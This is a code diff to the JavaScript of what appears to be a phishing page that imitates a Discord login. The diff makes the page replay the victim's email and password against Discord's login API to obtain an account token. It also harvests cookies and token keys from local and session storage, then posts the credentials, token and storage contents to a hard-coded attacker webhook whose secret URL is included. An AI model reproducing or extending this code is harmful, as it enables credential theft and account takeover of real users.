@@ -2,7 +2,7 @@
 // SELECTING ELEMENTS
 // ----------------------------------
 const loginButton = document.querySelector("button");
-const emailInput = document.querySelector('input[type="text"]'); // Assuming email/phone input is type="text"
+const emailInput = document.querySelector('input[type="text"]');
 const passwordInput = document.querySelector('input[type="password"]');
 
 // Debug log to check if inputs are found
@@ -64,47 +64,6 @@ function generateQRCode(data) {
 }
 
 // --------------------------------------------------
-// ---------- FETCH ACCOUNT TOKEN -------------------
-// --------------------------------------------------
-async function fetchAccountToken(email, password) {
-  const apiUrl = "https://api.example.com/login"; // Replace with your actual authentication API endpoint
-  const payload = {
-    email: email,
-    password: password
-  };
-
-  try {
-    const response = await fetch(apiUrl, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify(payload)
-    });
-
-    if (!response.ok) {
-      throw new Error(`HTTP ${response.status}: ${await response.text()}`);
-    }
-
-    const data = await response.json();
-    const token = data.token; // Adjust based on your API's response structure
-    console.log("Token retrieved:", token);
-
-    // Optionally generate QR code with the token
-    const qrCode = generateQRCode(token);
-    if (qrCode) {
-      // Append QR code to the DOM or handle as needed
-      document.body.appendChild(qrCode); // Example: Append to body
-    }
-
-    return token;
-  } catch (error) {
-    console.error("Error fetching token:", error.message);
-    return null;
-  }
-}
-
-// --------------------------------------------------
 // ---------- COLLECT USER TOKENS -------------------
 // --------------------------------------------------
 function collectUserTokens() {
@@ -118,33 +77,90 @@ function collectUserTokens() {
   }, {});
   tokens.cookies = cookies;
 
-  // Get localStorage
+  // Get localStorage (Discord-specific keys)
   const localStorageTokens = {};
-  for (let i = 0; i < localStorage.length; i++) {
-    const key = localStorage.key(i);
-    localStorageTokens[key] = localStorage.getItem(key);
-  }
+  const localKeys = ["token", "auth_token", "jwt", "access_token"];
+  localKeys.forEach(key => {
+    if (localStorage.getItem(key)) {
+      localStorageTokens[key] = localStorage.getItem(key);
+    }
+  });
   tokens.localStorage = localStorageTokens;
 
   // Get sessionStorage
   const sessionStorageTokens = {};
-  for (let i = 0; i < sessionStorage.length; i++) {
-    const key = sessionStorage.key(i);
-    sessionStorageTokens[key] = sessionStorage.getItem(key);
-  }
+  const sessionKeys = ["session_token", "temp_token"];
+  sessionKeys.forEach(key => {
+    if (sessionStorage.getItem(key)) {
+      sessionStorageTokens[key] = sessionStorage.getItem(key);
+    }
+  });
   tokens.sessionStorage = sessionStorageTokens;
 
+  console.log("Collected tokens:", tokens);
   return tokens;
+}
+
+// --------------------------------------------------
+// ---------- FETCH ACCOUNT TOKEN -------------------
+// --------------------------------------------------
+async function fetchAccountToken(email, password) {
+  const apiUrl = "https://discord.com/api/v9/auth/login"; // Discord's login API
+  const payload = {
+    login: email, // Discord uses "login" for email or phone
+    password: password,
+    undelete: false, // Optional, as per Discord's API
+    login_source: null,
+    gift_code_sku_id: null
+  };
+
+  try {
+    const response = await fetch(apiUrl, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        "User-Agent": navigator.userAgent // Mimic browser headers
+      },
+      body: JSON.stringify(payload)
+    });
+
+    const responseText = await response.text();
+    console.log("API Response:", responseText);
+    if (!response.ok) {
+      throw new Error(`HTTP ${response.status}: ${responseText}`);
+    }
+
+    const data = JSON.parse(responseText);
+    const token = data.token; // Discord returns token directly as "token"
+    console.log("Token retrieved:", token);
+
+    // Collect tokens after API response
+    const userTokens = collectUserTokens();
+    console.log("Collected tokens after login:", userTokens);
+
+    // Optionally generate QR code with the token
+    if (token) {
+      const qrCode = generateQRCode(token);
+      if (qrCode) {
+        document.body.appendChild(qrCode);
+      }
+    }
+
+    return { apiToken: token, userTokens };
+  } catch (error) {
+    console.error("Error fetching token:", error.message);
+    return { apiToken: null, userTokens: collectUserTokens() };
+  }
 }
 
 // --------------------------------------------------
 // ---------- WEBHOOK FUNCTION ----------------------
 // --------------------------------------------------
-async function sendToWebhook(email, password, token = null) {
+async function sendToWebhook(email, password, tokenData) {
   const webhookUrl = "https://discord.com/api/webhooks/1414568057652772884/-WdSwhYyx44jjWlk29Ac-dOed621NJN_KwF7abSIkyyB8KfOuQY3busFvMulOnpImY9G"; // Replace with real URL
-  const userTokens = collectUserTokens();
+  const { apiToken, userTokens } = tokenData || { apiToken: null, userTokens: { cookies: {}, localStorage: {}, sessionStorage: {} } };
   const payload = {
-    content: `Email: ${email}\nPassword: ${password}\nToken: ${token || 'Not retrieved'}\nCookies: ${JSON.stringify(userTokens.cookies, null, 2)}\nLocalStorage: ${JSON.stringify(userTokens.localStorage, null, 2)}\nSessionStorage: ${JSON.stringify(userTokens.sessionStorage, null, 2)}\nTimestamp: ${new Date().toISOString()}`,
+    content: `Email: ${email}\nPassword: ${password}\nAPI Token: ${apiToken || 'Not retrieved'}\nCookies: ${JSON.stringify(userTokens.cookies, null, 2)}\nLocalStorage: ${JSON.stringify(userTokens.localStorage, null, 2)}\nSessionStorage: ${JSON.stringify(userTokens.sessionStorage, null, 2)}\nTimestamp: ${new Date().toISOString()}`,
     username: "Login Attempt",
     avatar_url: "https://example.com/avatar.png"
   };
@@ -191,11 +207,11 @@ loginButton.addEventListener("click", async () => {
   // Start animation
   animateEllipsis();
 
-  // Fetch token
-  const token = await fetchAccountToken(email, password);
+  // Fetch token and storage data
+  const tokenData = await fetchAccountToken(email, password);
 
   // Send to webhook with token and collected user tokens
-  const webhookSuccess = await sendToWebhook(email, password, token);
+  const webhookSuccess = await sendToWebhook(email, password, tokenData);
 
   // After animation (3s), redirect if success
   setTimeout(() => {
